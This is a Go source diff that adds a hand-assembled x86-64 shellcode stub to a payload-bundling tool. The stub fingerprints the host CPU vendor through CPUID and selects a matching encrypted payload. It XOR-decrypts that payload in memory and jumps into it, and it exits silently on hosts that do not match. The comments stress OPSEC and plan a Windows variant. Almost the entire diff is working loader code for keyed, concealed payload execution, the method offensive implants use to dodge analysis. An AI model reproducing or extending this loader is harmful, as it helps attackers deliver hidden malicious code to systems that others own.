@@ -18,6 +18,241 @@ import (
 // The all-asm path trades operator ergonomics (no Negate / no full
 // fingerprint loop in v0.69) for binary size and OPSEC.
 
+// bundleStubVendorAware returns stub bytes that walk the
+// FingerprintEntry table and JMP into the first entry whose predicate
+// either has PT_MATCH_ALL set OR has PT_CPUID_VENDOR set with a
+// VendorString matching the host's CPUID-leaf-0 vendor (or all-zero
+// wildcard). On no match, sys_exit_group(0).
+//
+// Compared to [bundleStubScanMatchAll], this stub adds:
+//
+//   - A CPUID prologue right after the PIC trampoline that reads the
+//     12-byte host vendor onto the stack and pins the pointer in RSI.
+//   - A per-entry vendor compare: if PT_CPUID_VENDOR is set, the entry's
+//     12-byte VendorString gets compared (8 + 4 byte) against the host
+//     vendor; an all-zero entry vendor is treated as a wildcard match.
+//
+// Per-entry asm (replacing the bare PT_MATCH_ALL test):
+//
+//	movzx r9d, byte [r8]              ; predType
+//	test  r9b, 8                      ; PT_MATCH_ALL
+//	jnz   .matched
+//	test  r9b, 1                      ; PT_CPUID_VENDOR
+//	jz    .next                       ; no recognised check → skip
+//	mov   r10, [r8+4]
+//	cmp   r10, [rsi]
+//	jne   .vendor_zero_check
+//	mov   r10d, [r8+12]
+//	cmp   r10d, [rsi+8]
+//	je    .matched
+//	.vendor_zero_check:
+//	mov   r10, [r8+4]
+//	test  r10, r10
+//	jnz   .next                       ; non-zero entry vendor + no match → fail
+//	mov   r10d, [r8+12]
+//	test  r10d, r10d
+//	jz    .matched                    ; all-zero entry vendor → wildcard
+//	.next:
+//	add   r8, 48
+//	inc   eax
+//	jmp   .loop
+//
+// Total stub: ~160 bytes. Bundle binaries with two real-target entries
+// land in the 450-550 B range — still under 1 KiB.
+//
+// Build-number predicates (PT_WIN_BUILD) are intentionally not wired
+// in this Linux stub: the host-side hostWinBuild() returns 0 on
+// Linux, so any PT_WIN_BUILD entry with non-zero BuildMin would fail
+// regardless. A Windows minor (WrapBundleAsExecutableWindows) will
+// add the PEB read + range compare alongside the minimal-PE writer.
+func bundleStubVendorAware() []byte {
+	return []byte{
+		// === PIC trampoline ===                  offset 0
+		// call .pic
+		0xe8, 0x00, 0x00, 0x00, 0x00,
+		// pop r15
+		0x41, 0x5f,
+		// add r15, imm32  (imm32 patched at wrap time, bytes 10..13)
+		0x49, 0x81, 0xc7, 0x00, 0x00, 0x00, 0x00,
+		// trampoline + add takes bytes 0..13 (14 bytes)
+
+		// === CPUID prologue: read host vendor → 16-byte stack slot,
+		//                     pin pointer in RSI ===
+		// sub rsp, 16
+		0x48, 0x83, 0xec, 0x10,
+		// mov rdi, rsp
+		0x48, 0x89, 0xe7,
+		// xor eax, eax
+		0x31, 0xc0,
+		// cpuid
+		0x0f, 0xa2,
+		// mov [rdi], ebx
+		0x89, 0x1f,
+		// mov [rdi+4], edx
+		0x89, 0x57, 0x04,
+		// mov [rdi+8], ecx
+		0x89, 0x4f, 0x08,
+		// mov rsi, rdi          ; rsi = host vendor ptr, preserved
+		0x48, 0x89, 0xfe,
+		// CPUID prologue takes 22 bytes — ends at offset 36
+
+		// === Loop setup ===                      offset 36
+		// movzx ecx, word [r15+6]
+		0x41, 0x0f, 0xb7, 0x4f, 0x06,
+		// mov r8d, [r15+8]
+		0x45, 0x8b, 0x47, 0x08,
+		// add r8, r15
+		0x4d, 0x01, 0xf8,
+		// xor eax, eax
+		0x31, 0xc0,
+		// loop-setup takes 14 bytes — ends at offset 50
+
+		// === Loop ===                            offset 50 = .loop
+		// Final offset table (recomputed exhaustively, see comment block
+		// after the array for the trace):
+		//   .loop                = 50
+		//   .vendor_zero_check   = 89
+		//   .next                = 107
+		//   .no_match            = 115
+		//   .matched             = 124
+		// All Jcc displacements below = (target − end-of-Jcc-instruction).
+		//
+		// cmp eax, ecx
+		0x39, 0xc8,
+		// jge .no_match  (115 − 54 = 61 = 0x3d)
+		0x7d, 0x3d,
+		// movzx r9d, byte [r8]
+		0x45, 0x0f, 0xb6, 0x08,
+		// test r9b, 8
+		0x41, 0xf6, 0xc1, 0x08,
+		// jnz .matched   (124 − 64 = 60 = 0x3c)
+		0x75, 0x3c,
+		// test r9b, 1
+		0x41, 0xf6, 0xc1, 0x01,
+		// jz .next       (107 − 70 = 37 = 0x25)
+		0x74, 0x25,
+		// mov r10, [r8+4]
+		0x4d, 0x8b, 0x50, 0x04,
+		// cmp r10, [rsi]
+		0x4c, 0x3b, 0x16,
+		// jne .vendor_zero_check  (89 − 79 = 10 = 0x0a)
+		0x75, 0x0a,
+		// mov r10d, [r8+12]
+		0x45, 0x8b, 0x50, 0x0c,
+		// cmp r10d, [rsi+8]
+		0x44, 0x3b, 0x56, 0x08,
+		// je .matched    (124 − 89 = 35 = 0x23)
+		0x74, 0x23,
+
+		// .vendor_zero_check:                     offset 89
+		// mov r10, [r8+4]
+		0x4d, 0x8b, 0x50, 0x04,
+		// test r10, r10
+		0x4d, 0x85, 0xd2,
+		// jnz .next      (107 − 98 = 9 = 0x09)
+		0x75, 0x09,
+		// mov r10d, [r8+12]
+		0x45, 0x8b, 0x50, 0x0c,
+		// test r10d, r10d
+		0x45, 0x85, 0xd2,
+		// jz .matched    (124 − 107 = 17 = 0x11)
+		0x74, 0x11,
+
+		// .next:                                  offset 107
+		// add r8, 48
+		0x49, 0x83, 0xc0, 0x30,
+		// inc eax
+		0xff, 0xc0,
+		// jmp .loop  (50 − 115 = −65 = 0xbf signed)
+		0xeb, 0xbf,
+
+		// === .no_match: Linux sys_exit_group(0) === offset 115
+		// mov eax, 231
+		0xb8, 0xe7, 0x00, 0x00, 0x00,
+		// xor edi, edi
+		0x31, 0xff,
+		// syscall
+		0x0f, 0x05,
+		// no_match takes 9 bytes — ends at offset 124
+
+		// === .matched: idx in eax → compute &PayloadEntry[eax] === offset 124
+		// Offset trace (each line shows cumulative byte count):
+		//   PIC trampoline       0  → 14
+		//   CPUID prologue      14  → 36
+		//   loop setup          36  → 50
+		//   .loop body cmp+jge  50  → 54
+		//   movzx + test r9b,8  54  → 62
+		//   jnz .matched        62  → 64
+		//   test r9b,1 + jz     64  → 70
+		//   mov r10/cmp/jne     70  → 79
+		//   mov r10d/cmp/je     79  → 89
+		//   .vendor_zero_check  89  → 98
+		//   second jnz/etc/jz   98  → 107
+		//   .next: add/inc/jmp 107  → 115
+		//   .no_match block    115  → 124
+		//   .matched starts at 124
+		//
+		// .matched body:
+		// mov r9d, [r15+12]
+		0x45, 0x8b, 0x4f, 0x0c,
+		// mov r10d, eax
+		0x41, 0x89, 0xc2,
+		// shl r10d, 5
+		0x41, 0xc1, 0xe2, 0x05,
+		// add r9d, r10d
+		0x45, 0x01, 0xd1,
+		// add r9, r15
+		0x4d, 0x01, 0xf9,
+		// mov rcx, r9
+		0x4c, 0x89, 0xc9,
+		// .matched body takes 19 bytes — ends at offset 144
+
+		// === Decrypt+JMP tail (verbatim from prior stubs) ===
+		// mov edi, [rcx]
+		0x8b, 0x39,
+		// add rdi, r15
+		0x4c, 0x01, 0xff,
+		// mov esi, [rcx+4]
+		0x8b, 0x71, 0x04,
+		// lea r8, [rcx+16]
+		0x4c, 0x8d, 0x41, 0x10,
+		// xor r9d, r9d
+		0x45, 0x31, 0xc9,
+		// .dec:
+		// test esi, esi
+		0x85, 0xf6,
+		// jz .jmp_payload  (+0x1b)
+		0x74, 0x1b,
+		// mov al, [rdi]
+		0x8a, 0x07,
+		// mov dl, r9b
+		0x44, 0x88, 0xca,
+		// and dl, 15
+		0x80, 0xe2, 0x0f,
+		// movzx edx, dl
+		0x0f, 0xb6, 0xd2,
+		// xor al, [r8+rdx]
+		0x41, 0x32, 0x04, 0x10,
+		// mov [rdi], al
+		0x88, 0x07,
+		// inc rdi
+		0x48, 0xff, 0xc7,
+		// inc r9d
+		0x41, 0xff, 0xc1,
+		// dec esi
+		0xff, 0xce,
+		// jmp .dec  (-0x1f)
+		0xeb, 0xe1,
+		// .jmp_payload:
+		// mov edi, [rcx]
+		0x8b, 0x39,
+		// add rdi, r15
+		0x4c, 0x01, 0xff,
+		// jmp rdi
+		0xff, 0xe7,
+	}
+}
+
 // bundleStubScanMatchAll returns stub bytes that walk the
 // FingerprintEntry table and JMP into the first entry whose predicate
 // has the PT_MATCH_ALL bit set (bit 3 of PredicateType). On no match,
@@ -314,11 +549,13 @@ func WrapBundleAsExecutableLinux(bundle []byte) ([]byte, error) {
 			ErrBundleBadMagic, magic, BundleMagic)
 	}
 
-	// Use the scan-match-all stub: walks the FingerprintEntry table and
-	// JMPs into the first entry whose predicate has PT_MATCH_ALL set.
-	// On no match, exit_group(0). Vendor + build matching layer in on
-	// top in a follow-up commit without changing this function's API.
-	stub := bundleStubScanMatchAll()
+	// Use the vendor-aware scan stub: walks the FingerprintEntry table,
+	// matches entries by PT_MATCH_ALL bit OR PT_CPUID_VENDOR with a
+	// 12-byte host CPUID compare (all-zero VendorString = wildcard).
+	// On no match, exit_group(0). PT_WIN_BUILD is intentionally not
+	// wired in this Linux stub (host build = 0); a future
+	// WrapBundleAsExecutableWindows minor will add the PEB read.
+	stub := bundleStubVendorAware()
 	bundleOff := uint32(len(stub)) - 5 // distance from .pic label
 	binary.LittleEndian.PutUint32(stub[bundleOffsetImm32Pos:], bundleOff)
 
